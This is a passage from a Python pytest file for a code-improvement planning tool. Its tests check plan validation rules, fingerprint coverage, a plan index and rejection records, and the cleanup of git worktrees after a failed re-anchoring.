            'The repository no longer contains apps/catalog/api.py.'
        )
    ]
    plan["test_plan"] = {
        "mode": "not-applicable", "rationale": "The implementation is believed to be dead production code.",
        "existing_coverage": [], "exemplars": [], "cases": [],
    }
    plan["done_criteria"] = [_criterion("static-invariant", "apps/catalog/api.py is absent from the repository."),]

    issues = _issues(repo, plan)

    assert [render_issue(issue) for issue in issues] == ["TEST_PLAN_NOT_APPLICABLE_UNSAFE@/steps/0/changes/0/operation"]


def _comment_cleanup_plan(*, instruction: str, target_state: str,) -> dict[str, Any]:
    plan = _authored_plan(title="Remove a self evident catalog comment")
    plan["scope"]["existing_paths"] = [plan["scope"]["existing_paths"][0]]
    plan["context_excerpts"] = [plan["context_excerpts"][0]]
    plan["steps"][0]["changes"] = [
        _change('apps/catalog/api.py', 'comment above list_catalog', 'modify', instruction, target_state)
    ]
    plan["test_plan"] = {
        "mode": "not-applicable", "rationale": "Removing this comment cannot change executable behavior.",
        "existing_coverage": [], "exemplars": [], "cases": [],
    }
    plan["done_criteria"] = [_criterion("static-invariant", target_state),]
    return plan


def test_not_applicable_requires_an_explicit_non_test_done_gate(repo: Path) -> None:
    plan = _comment_cleanup_plan(
        instruction=("Remove the self-evident comment above list_catalog without changing the function body."),
        target_state=("The self-evident comment is absent and list_catalog is unchanged."),
    )
    plan["done_criteria"] = [_criterion("behavior", "The list_catalog function body remains byte-for-byte unchanged."),]
    issues = _issues(repo, plan)
    assert [render_issue(issue) for issue in issues] == ["NON_TEST_VERIFICATION_REQUIRED@/done_criteria"]


def test_not_applicable_allows_shortening_a_comment_without_code_changes(repo: Path,) -> None:
    target_state = "The catalog comment is shorter while the function body remains unchanged."
    plan = _comment_cleanup_plan(instruction=(
            "Shorten the catalog comment to retain only its non-obvious rationale without editing executable code."
        ), target_state=target_state,
    )
    assembled = _assembled(repo, plan)
    assert assembled["test_plan"]["mode"] == "not-applicable"
    assert any(criterion["kind"] == "static-invariant" and criterion["description"] == target_state
        for criterion in assembled["done_criteria"]
    )


def test_deletion_only_production_plan_can_use_existing_coverage(repo: Path,) -> None:
    plan = _authored_plan(title="Delete obsolete catalog implementation")
    _use_existing_catalog_coverage(plan)
    plan["steps"][0]["changes"] = [_change('apps/catalog/api.py', 'legacy_catalog_loader', 'delete',
            'Delete legacy_catalog_loader while preserving list_catalog and its existing public return behavior.',
            'legacy_catalog_loader is absent and list_catalog remains present.'
        )
    ]
    assembled = _assembled(repo, plan)
    assert assembled["test_plan"]["mode"] == "existing-coverage"
    assert all(change["operation"] == "delete" for change in assembled["steps"][0]["changes"])
    assert any(criterion["kind"] == "static-invariant" and "legacy_catalog_loader" in criterion["description"]
        for criterion in assembled["done_criteria"]
    )


def test_plan_must_cover_every_expected_aggregate_fingerprint(repo: Path, head_sha: str,) -> None:
    plan = _authored_plan()

    assembled, issues = assemble_plan(plan, repo=repo, recon_commands=_recon_commands(),
        expected_fingerprints=["fp-fix-n-plus-one", "fp-repeated-tests"],
    )

    assert assembled is None
    assert [render_issue(issue) for issue in issues] == [
        "COVERED_FINGERPRINTS_MISMATCH@/covered_fingerprints#missing=1;extra=0"
    ]

    plan["covered_fingerprints"].append("fp-repeated-tests")
    assembled, issues = assemble_plan(plan, repo=repo, recon_commands=_recon_commands(),
        expected_fingerprints=["fp-repeated-tests", "fp-fix-n-plus-one"],
    )
    assert issues == ()
    assert assembled is not None
    assert set(assembled["covered_fingerprints"]) == {"fp-fix-n-plus-one", "fp-repeated-tests",}
    assert "Order is not significant" in PLAN_AUTHOR_SCHEMA["properties"]["covered_fingerprints"]["description"]
    rendered = _render_assembled_plan(assembled, head_sha)
    assert "**Covered finding fingerprints**: `fp-fix-n-plus-one`, `fp-repeated-tests`" in rendered


def test_excerpt_start_beyond_eof_blocks(repo: Path) -> None:
    plan = _authored_plan()
    plan["context_excerpts"][0].update(start_line=50, end_line=60)
    issues = _issues(repo, plan)
    assert [(issue.code, issue.pointer, issue.detail)
        for issue in issues if issue.code == "EXCERPT_ANCHOR_INVALID"
    ] == [("EXCERPT_ANCHOR_INVALID", "/context_excerpts/0", "lines=2")]


def test_repair_prompt_drops_malformed_detail_segment() -> None:
    prompt = build_plan_writer_repair_prompt(
        "original writer prompt", [AssemblyIssue("AUTHOR_SCHEMA_INVALID", "/x", "bad,stuff!")],
    )
    assert "/x" in prompt
    assert "bad,stuff!" not in prompt
    assert '"detail"' not in prompt


def test_plan_index_persists_package_and_member_identities(repo: Path, head_sha: str) -> None:
    plans_dir = repo / "daydream_plans"
    first = {**_finding(fingerprint="fp-first"), "title": "Repeated catalog fixture setup obscures behavior",
        "category": "tests", "line": 1, "maintenance_signals": ["duplicated_test_structure"],
        "reuse_target": "repo:catalog_fixture"}
    second = {**first, "fingerprint": "fp-second", "title": "Catalog fixture setup repeats in every test"}
    original = aggregate_cross_service([first])[0]
    expanded = aggregate_cross_service([first, second])[0]
    seed = [
        {**_finding(fingerprint="pkg-original"), "package_fingerprint": "pkg-original",
            "member_fingerprints": ["fp-shared", "fp-original-only"],
            "member_aliases": ["member:shared", "member:original"]},
        {**_finding(fingerprint="pkg-amb-first"), "package_fingerprint": "pkg-amb-first",
            "member_fingerprints": ["fp-amb-shared", "fp-amb-first"]},
        {**_finding(fingerprint="pkg-amb-second"), "package_fingerprint": "pkg-amb-second",
            "member_fingerprints": ["fp-amb-shared", "fp-amb-second"]}, original, _finding(fingerprint="fp-legacy"),
    ]
    assembled = _assembled(repo)
    seeded = _write_plans(plans_dir, [{"finding": finding, **assembled} for finding in seed], planned_at=head_sha)
    assert [entry["number"] for entry in seeded["written"]] == [1, 2, 3, 4, 5]
    sidecar = _read_sidecar(plans_dir)
    assert (sidecar["plans"][0]["package_fingerprint"], sidecar["plans"][0]["member_fingerprints"],
        sidecar["plans"][0]["member_aliases"]) == (
        "pkg-original", ["fp-shared", "fp-original-only"], ["member:shared", "member:original"],
    )
    for key in ("package_fingerprint", "member_fingerprints", "member_aliases"):
        sidecar["plans"][4].pop(key)
    (plans_dir / PLAN_INDEX_FILENAME).write_text(json.dumps(sidecar))
    rejections = [
        {"fingerprint": "fp-rejected", "title": "Phantom N+1", "path": "apps/catalog/api.py",
            "reason": "No query loop exists.", "rejected_at_sha": "123"},
        {"fingerprint": "fp-r1", "title": "By-design behavior", "path": "apps/billing/api.py",
            "reason": "Documented behavior.", "rejected_at_sha": "456"},
        {"fingerprint": "fp-r2", "title": "Second rejected member"},
    ]
    record_rejections(plans_dir, rejections[:1])
    record_rejections(plans_dir, rejections[1:])
    assert load_rejections(plans_dir) == {"fp-rejected": rejections[0], "fp-r1": rejections[1], "fp-r2": rejections[2]}
    assert json.loads((plans_dir / "rejected.json").read_text()) == {"schema_version": 1, "rejected": rejections}
    current = [
        {**_finding(fingerprint="pkg-reworded"), "package_fingerprint": "pkg-reworded",
            "member_fingerprints": ["reworded-shared", "reworded-original"],
            "member_aliases": ["member:shared", "member:original"]}, _finding(fingerprint="fp-legacy"),
        {**_finding(fingerprint="pkg-expanded"), "package_fingerprint": "pkg-expanded",
            "member_fingerprints": ["fp-shared", "fp-new-member"]}, expanded,
        {**_finding(fingerprint="pkg-amb-third"), "package_fingerprint": "pkg-amb-third",
            "member_fingerprints": ["fp-amb-shared", "fp-amb-third"]},
        {**_finding(fingerprint="pkg-partial-rejection"), "package_fingerprint": "pkg-partial-rejection",
            "member_fingerprints": ["fp-rejected", "fp-unanswered"]},
        {**_finding(fingerprint="pkg-all-rejected"), "package_fingerprint": "pkg-all-rejected",
            "member_fingerprints": ["fp-r1", "fp-r2"]},
    ]
    replay = _write_plans(plans_dir, [{"finding": finding, **assembled} for finding in current], planned_at=head_sha)
    assert [(entry["finding"]["fingerprint"], entry["number"], entry["path"]) for entry in replay["written"]] == [
        ("pkg-expanded", 6, "006-batch-catalog-queries.md"),
        (expanded["fingerprint"], 7, "007-batch-catalog-queries.md"),
        ("pkg-amb-third", 8, "008-batch-catalog-queries.md"),
        ("pkg-partial-rejection", 9, "009-batch-catalog-queries.md"),
    ]
    assert [(entry["finding"]["fingerprint"], entry.get("number"), entry.get("path"))
        for entry in replay["skipped"]] == [
        ("pkg-reworded", 1, "001-batch-catalog-queries.md"), ("fp-legacy", 5, "005-batch-catalog-queries.md"),
        ("pkg-all-rejected", None, None),
    ]
    assert "number" not in replay["skipped"][2] and "path" not in replay["skipped"][2]
    entries = _read_sidecar(plans_dir)["plans"]
    assert [(entry["number"], entry["member_fingerprints"]) for entry in entries] == [
        (1, ["fp-shared", "fp-original-only"]), (2, ["fp-amb-shared", "fp-amb-first"]),
        (3, ["fp-amb-shared", "fp-amb-second"]), (4, ["fp-first"]), (5, ["fp-legacy"]),
        (6, ["fp-shared", "fp-new-member"]), (7, ["fp-first", "fp-second"]),
        (8, ["fp-amb-shared", "fp-amb-third"]), (9, ["fp-rejected", "fp-unanswered"]),
    ]
    assert entries[6]["member_aliases"] == [original["member_aliases"][0], original["member_aliases"][0]]
    assert entries[4]["package_fingerprint"] == "fp-legacy"
    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")) == [
        f"{number:03d}-batch-catalog-queries.md" for number in range(1, 10)
    ]


def _write_single_entry_sidecar(plans_dir: Path, status: str) -> None:
    plans_dir.mkdir(parents=True, exist_ok=True)
    entry = PlanIndexEntry(
        number=1, slug="batch-catalog-queries", title="Fix N+1 catalog queries", fingerprint="fp-fix-n-plus-one",
        package_fingerprint="fp-fix-n-plus-one", member_fingerprints=("fp-fix-n-plus-one",), member_aliases=(),
        priority="P1", effort="M", planned_at="0000000000000000000000000000000000000000",
        status=status, host_blocked=False,
    )
    (plans_dir / ".index.json").write_text(
        json.dumps({"schema_version": 1, "plans": [asdict(entry)],}), encoding="utf-8",
    )


def test_reanchored_plan_rows_tolerant_of_status_without_landed_suffix(tmp_path: Path,) -> None:
    plans_dir = tmp_path / "daydream_plans"
    _write_single_entry_sidecar(plans_dir, "REANCHORED")
    rows = reanchored_plan_rows(plans_dir)
    assert len(rows) == 1
    assert rows[0].number == 1
    assert rows[0].status.startswith("REANCHORED")
    assert rows[0].landing_path is None


def test_reanchored_plan_rows_returns_empty_when_none_reanchored(tmp_path: Path,) -> None:
    plans_dir = tmp_path / "daydream_plans"
    _write_single_entry_sidecar(plans_dir, "TODO")
    assert reanchored_plan_rows(plans_dir) == []
    assert reanchored_plan_rows(tmp_path / "does-not-exist") == []


def test_reanchored_failure_releases_worktree_lock(repo: Path, head_sha: str, monkeypatch: pytest.MonkeyPatch,) -> None:
    _advance_head(repo)

    def _boom(*args: Any, **kwargs: Any) -> Any:
        raise RuntimeError("render failure")

    # Only intentional failure-injection mock in the plan: deterministically
    # fail INSIDE the post-lock write window (permission sabotage breaks under
    # root CI; the real-path rule protects the network/API backend, not this).
    monkeypatch.setattr("daydream.improve.plans.render_plan", _boom)

    session = PlanWriteSession(repo / "daydream_plans", planned_at=head_sha, run_session_id="run-A")
    reservations = session.reserve([_finding()])
    out = session.commit(reservations[0], _selection(repo))
    assert out.status == "blocked"

    worktree = _operational_root(repo) / "run-A-reanchor"
    assert not worktree.exists()  # removed (fix #2)
    with pytest.raises(git_ops.GitError, match="Git directory"):
        git_ops.worktree_lock_mtime(worktree)


def test_failed_reanchor_frees_worktree_for_later_finding(repo: Path, head_sha: str, monkeypatch: pytest.MonkeyPatch,
) -> None:
    _advance_head(repo)

    calls = {"n": 0}

    def _boom(*args: Any, **kwargs: Any) -> Any:
        calls["n"] += 1
        if calls["n"] == 1:
            raise RuntimeError("first re-anchor render fails")
        return render_plan(*args, **kwargs)

    monkeypatch.setattr("daydream.improve.plans.render_plan", _boom)

    session = PlanWriteSession(repo / "daydream_plans", planned_at=head_sha, run_session_id="run-A")
    reservations = session.reserve([_finding(), _finding()])
    first = session.commit(reservations[0], _selection(repo))
    assert first.status == "blocked"

    second = session.commit(reservations[1], _selection(repo))
    assert second.status == "written", "later re-anchorable finding must still land"

    result = session.finish()
    assert len(result["written"]) == 1


def test_stale_locked_reanchor_worktree_is_reclaimed(repo: Path) -> None:
    stale = _operational_root(repo) / "run-dead-reanchor"
    git_ops.worktree_add(repo, stale, "HEAD", lock_reason="run-dead")
    git_dir = Path(git(repo, "rev-parse", "--git-common-dir"))
    if not git_dir.is_absolute():
        git_dir = repo / git_dir
    locked = git_dir / "worktrees" / "run-dead-reanchor" / "locked"
    os.utime(locked, (0, 0))  # backdate to 1970: older than any staleness window
    removed = prune_stale_reanchor_worktrees(repo)
    assert removed == 1
    assert not stale.exists()
    assert "run-dead-reanchor" not in git(repo, "worktree", "list")
